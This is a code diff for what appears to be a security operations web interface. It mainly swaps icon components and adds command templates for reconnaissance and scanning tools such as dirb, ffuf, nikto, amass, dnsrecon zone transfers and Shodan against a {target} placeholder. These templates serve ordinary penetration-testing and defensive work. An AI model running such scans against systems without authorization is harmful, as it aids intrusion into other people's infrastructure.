+ { name:"Dirb", command:"dirb", description:"Web content scanner", category:"Web", icon: UilSearch, requiresTarget: true, template:"dirb http://{target} /usr/share/wordlists/dirb/common.txt" },
+ { name:"FFuf", command:"ffuf", description:"Fast web fuzzer", category:"Web", icon: UilBolt, requiresTarget: true, template:"ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt" },
+ { name:"Nikto", command:"nikto", description:"Web server scanner", category:"Web", icon: UilDesktopAlt, requiresTarget: true, template:"nikto -h {target}" },
+ { name:"WhatWeb", command:"whatweb", description:"Web technology identifier", category:"Web", icon: UilEye, requiresTarget: true, template:"whatweb {target}" },
+ { name:"theHarvester All", command:"theHarvester", description:"OSINT gathering tool", category:"OSINT", icon: UilEye, requiresTarget: true, template:"theHarvester -d {target} -b all" },
+ { name:"theHarvester Google", command:"theHarvester", description:"Google dorking", category:"OSINT", icon: UilSearch, requiresTarget: true, template:"theHarvester -d {target} -b google" },
+ { name:"Amass Enum", command:"amass", description:"In-depth DNS enumeration", category:"DNS", icon: UilGlobe, requiresTarget: true, template:"amass enum -d {target}" },
+ { name:"Amass Intel", command:"amass", description:"Intelligence collection", category:"OSINT", icon: UilEye, requiresTarget: true, template:"amass intel -d {target}" },
+ { name:"Sublist3r", command:"sublist3r", description:"Subdomain enumeration", category:"DNS", icon: UilSitemap, requiresTarget: true, template:"sublist3r -d {target}" },
+ { name:"Subfinder", command:"subfinder", description:"Fast passive subdomain discovery", category:"DNS", icon: UilSearch, requiresTarget: true, template:"subfinder -d {target}" },
+ { name:"DNSRecon Standard", command:"dnsrecon", description:"Standard DNS enumeration", category:"DNS", icon: UilWifi, requiresTarget: true, template:"dnsrecon -d {target} -t std" },
+ { name:"DNSRecon Zone Transfer", command:"dnsrecon", description:"DNS zone transfer", category:"DNS", icon: UilDatabase, requiresTarget: true, template:"dnsrecon -d {target} -t axfr" },
+ { name:"Fierce", command:"fierce", description:"DNS reconnaissance", category:"DNS", icon: UilSearch, requiresTarget: true, template:"fierce --domain {target}" },
+ { name:"Shodan Search", command:"shodan", description:"Internet-connected device search", category:"OSINT", icon: UilSearch, requiresTarget: true, template:"shodan search {target}" },
+ { name:"Shodan Host", command:"shodan", description:"Host information lookup", category:"OSINT", icon: UilDesktopAlt, requiresTarget: true, template:"shodan host {target}" },
+ { name:"Recon-ng", command:"recon-ng", description:"Full-featured reconnaissance framework (requires resource file for automation)", category:"OSINT", icon: UilWindow, requiresTarget: false, template:"recon-ng -r /path/to/resource/file" },
+ { name:"Metagoofil", command:"metagoofil", description:"Metadata extraction tool", category:"OSINT", icon: UilFileAlt, requiresTarget: true, template:"metagoofil -d {target} -t pdf,doc -l 50 -o output -f results.html" },
+ { name:"SpiderFoot", command:"spiderfoot", description:"OSINT automation (CLI mode)", category:"OSINT", icon: UilEye, requiresTarget: true, template:"spiderfoot -s {target} -m all" },
+ { name:"Whois", command:"whois", description:"Domain registration lookup", category:"OSINT", icon: UilGlobe, requiresTarget: true, template:"whois {target}" },
+ { name:"Nslookup", command:"nslookup", description:"DNS query tool", category:"DNS", icon: UilWifi, requiresTarget: true, template:"nslookup {target}" },
+ { name:"Dig", command:"dig", description:"DNS lookup utility", category:"DNS", icon: UilSitemap, requiresTarget: true, template:"dig {target} ANY" },
 ];
 
 /**
@@ -813,7 +813,7 @@ Your role is to help organizations protect their infrastructure, detect threats,
  transition={{ duration: 0.4 }}
  >
  <h1 className="text-3xl font-bold text-gradient-silver flex items-center gap-3">
- <Terminal size={32} weight="duotone" className="text-primary" />
+ <UilWindow size={32} className="text-primary" />
  Cyber Operations Command Center
  </h1>
  <p className="text-sm text-muted-foreground mt-2">
@@ -824,19 +824,19 @@ Your role is to help organizations protect their infrastructure, detect threats,
  <Tabs value={activeTab} onValueChange={(v) => setActiveTab(v as"scan" |"recon" |"attack" |"defence")} className="flex-1 flex flex-col">
  <TabsList className="grid w-full grid-cols-4 bg-card/50 backdrop-blur">
  <TabsTrigger value="scan" className="data-[state=active]:bg-transparent">
- <Scan size={16} weight="bold" className="mr-2" />
+ <UilQrcodeScan size={16} className="mr-2" />
  SCANNING
  </TabsTrigger>
  <TabsTrigger value="recon" className="data-[state=active]:bg-transparent">
- <MagnifyingGlass size={16} weight="bold" className="mr-2" />
+ <UilSearch size={16} className="mr-2" />
  RECON
  </TabsTrigger>
  <TabsTrigger value="attack" className="data-[state=active]:bg-transparent">
- <Sword size={16} weight="bold" className="mr-2" />
+ <UilBoltAlt size={16} className="mr-2" />
  ATTACK
  </TabsTrigger>
  <TabsTrigger value="defence" className="data-[state=active]:bg-transparent">
- <Shield size={16} weight="bold" className="mr-2" />
+ <UilShield size={16} className="mr-2" />
  DEFENCE
  </TabsTrigger>
  </TabsList>
@@ -862,7 +862,7 @@ Your role is to help organizations protect their infrastructure, detect threats,
  onClick={() => selectTool(tool)}
  >
  <div className="flex items-start gap-3 w-full">
- <Icon size={20} weight="duotone" className="mt-0.5 flex-shrink-0" />
+ <Icon size={20} className="mt-0.5 flex-shrink-0" />
  <div className="flex-1 min-w-0">
  <div className="font-semibold">{tool.name}</div>
  <div className="text-xs text-muted-foreground truncate">
@@ -916,9 +916,9 @@ Your role is to help organizations protect their infrastructure, detect threats,
  title="Search threat intelligence about this target"
  >
  {isLoadingIntel ? (
- <CircleNotch size={16} weight="bold" className="animate-spin" />
+ <UilSpinner size={16} className="animate-spin" />
  ) : (
- <Eye size={16} weight="bold" />
+ <UilEye size={16} />
  )}
  Intel
  </Button>
@@ -947,7 +947,7 @@ Your role is to help organizations protect their infrastructure, detect threats,
  onClick={() => setShowHistory(!showHistory)}
  className="gap-2"
  >
- <Clock size={16} weight="bold" />
+ <UilClock size={16} />
  History ({commandHistory.length})
  </Button>
  </div>
@@ -960,7 +960,7 @@ Your role is to help organizations protect their infrastructure, detect threats,
  <CardHeader>
  <CardTitle className="flex items-center justify-between">
  <span className="flex items-center gap-2">
- <Clock size={20} weight="duotone" />
+ <UilClock size={20} />
  Command History
  </span>
  <Badge variant="secondary">{commandHistory.length} commands</Badge>
@@ -992,8 +992,8 @@ Your role is to help organizations protect their infrastructure, detect threats,
  className="h-7 w-7"
  onClick={() => toggleHistoryFavorite(item.id)}
  >
- <Star
- size={16} weight="bold" className={`${item.isFavorite ? 'fill-yellow-500 text-yellow-500' : ''}`}
+ <UilStar
+ size={16} className={`${item.isFavorite ? 'fill-yellow-500 text-yellow-500' : ''}`}
  />
  </Button>
  <Button
@@ -1002,7 +1002,7 @@ Your role is to help organizations protect their infrastructure, detect threats,
  className="h-7 w-7"
  onClick={() => copyCommand(item.command)}
  >
- <Copy size={16} weight="bold" />
+ <UilCopy size={16} />
  </Button>
  <Button
  size="icon"
@@ -1010,24 +1010,24 @@ Your role is to help organizations protect their infrastructure, detect threats,
  className="h-7 w-7"
  onClick={() => loadHistoryCommand(item)}
  >
- <Terminal size={16} weight="bold" />
+ <UilWindow size={16} />
  </Button>
  <Button
  size="icon"
  variant="ghost" className="h-7 w-7 text-destructive"
  onClick={() => deleteHistoryItem(item.id)}
  >
- <Trash size={16} weight="bold" />
+ <UilTrashAlt size={16} />
  </Button>
  </div>
  </div>
  <div className="flex items-center gap-4 text-xs text-muted-foreground">
  <span className="flex items-center gap-1">
- <Clock size={12} weight="bold" />
+ <UilClock size={12} />
  {item.timestamp.toLocaleString()}
  </span>
  <span className={item.success ? 'text-emerald-500' : 'text-red-500'}>
- {item.success ? <CheckCircle size={12} weight="bold" className="inline mr-1" /> : <Warning size={12} weight="bold" className="inline mr-1" />}
+ {item.success ? <UilCheckCircle size={12} className="inline mr-1" /> : <UilExclamationTriangle size={12} className="inline mr-1" />}
  {item.success ? 'Success' : 'Failed'}
  </span>
  <span>{item.executionTime}ms</span>
@@ -1045,7 +1045,7 @@ Your role is to help organizations protect their infrastructure, detect threats,
  <Card className="bg-card/50 backdrop-blur">
  <CardHeader>
  <CardTitle className="flex items-center gap-2">
- <Eye size={20} weight="duotone" className="text-purple-500" />
+ <UilEye size={20} className="text-purple-500" />
  Threat Intelligence Report
  </CardTitle>
  <CardDescription>
@@ -1082,7 +1082,7 @@ Your role is to help organizations protect their infrastructure, detect threats,
  <Card className="bg-card/50 backdrop-blur">
  <CardHeader>
  <CardTitle className="flex items-center gap-2">
- <Pulse size={20} weight="duotone" className="text-primary animate-pulse" />
+ <UilHeartRate size={20} className="text-primary animate-pulse" />
  {getAgentName()}
  </CardTitle>
  <CardDescription>{getAgentPrompt()}</CardDescription>
@@ -1136,9 +1136,9 @@ Your role is to help organizations protect their infrastructure, detect threats,
  disabled={!chatInput.trim() || isStreaming}
  >
  {isStreaming ? (
- <CircleNotch size={16} weight="bold" className="animate-spin" />
+ <UilSpinner size={16} className="animate-spin" />
  ) : (
- <PaperPlaneTilt size={16} weight="bold" />
+ <UilPlaneFly size={16} />
  )}
  </Button>
  </div>
